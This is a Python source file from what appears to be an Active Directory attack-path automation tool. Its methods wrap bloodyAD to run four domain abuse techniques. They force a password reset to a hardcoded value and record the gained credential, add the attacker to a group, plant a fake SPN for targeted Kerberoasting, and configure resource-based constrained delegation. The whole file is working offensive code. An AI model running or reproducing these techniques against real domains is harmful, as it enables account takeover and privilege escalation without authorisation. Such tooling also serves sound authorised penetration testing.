# strategies/ad_techniques.py
from services.printing import print_done
from entities.exploit_result import ExploitResult
from entities.credentials import Credential
from exceptions.hop_failed_error import HopFailedError
from .bloodyad_base import HARDCODED_PASSWORD


class ADTechniquesMixin:
    def _do_force_change_password(self, creds: dict) -> ExploitResult:
        target_sam = self.target.sam()
        new_password = HARDCODED_PASSWORD

        self._run_bloodyad(
            creds,
            ["set", "password", target_sam, new_password],
            "ForceChangePassword"
        )

        print_done(f"Password changed for {target_sam} → {new_password}")
        return ExploitResult(
            technique="ForceChangePassword",
            edge=self.edge,
            success=True,
            notes=(
                f"Password reset for {target_sam}\n"
                f"Username: {target_sam}\n"
                f"Password: {new_password}\n"
                f"Domain: {creds['domain']}"
            ),
            gained_access=Credential(
                username=target_sam,
                password=new_password,
                domain=creds.get("domain"),
                dc_ip=creds.get("dc_ip"),
            ),
        )

    def _do_add_member(self, creds: dict) -> ExploitResult:
        group_sam = self.target.sam()
        member_sam = self.attacker.sam()

        try:
            self._run_bloodyad(
                creds,
                ["add", "groupMember", group_sam, member_sam],
                "AddMember"
            )
        except HopFailedError as e:
            error_msg = str(e)
            if "entryAlreadyExists" in error_msg or "already a member" in error_msg:
                print_done(f"{member_sam} already a member of {group_sam} — OK")
                return ExploitResult(
                    technique="AddMember",
                    edge=self.edge,
                    success=True,
                    notes=f"{member_sam} already a member of {group_sam} (idempotent)",
                )
            raise  # re-raise if it's a different error

        print_done(f"{member_sam} added to {group_sam}")
        return ExploitResult(
            technique="AddMember",
            edge=self.edge,
            success=True,
            notes=f"{member_sam} added to {group_sam}",
        )

    def _do_targeted_kerberoast(self, creds: dict) -> ExploitResult:
        target_sam = self.target.sam()
        fake_spn = f"fake/roast.{creds['domain']}"

        self._run_bloodyad(
            creds,
            ["set", "object", target_sam, "servicePrincipalNames", fake_spn],
            "TargetedKerberoast"
        )

        print_done(f"SPN set on {target_sam}: {fake_spn}")
        return ExploitResult(
            technique="TargetedKerberoast",
            edge=self.edge,
            success=True,
            notes=f"SPN {fake_spn} added to {target_sam}; ready for Kerberoasting",
        )

    def _do_rbcd(self, creds: dict) -> ExploitResult:
        target_sam = self.target.sam()
        attacker_sam = self.attacker.sam()

        self._run_bloodyad(
            creds,
            ["add", "rbcd", target_sam, attacker_sam],
            "RBCD"
        )

        print_done(f"RBCD set: {attacker_sam} → {target_sam}")
        return ExploitResult(
            technique="RBCD",
            edge=self.edge,
            success=True,
            notes=f"RBCD configured: {attacker_sam} can impersonate against {target_sam}",
        )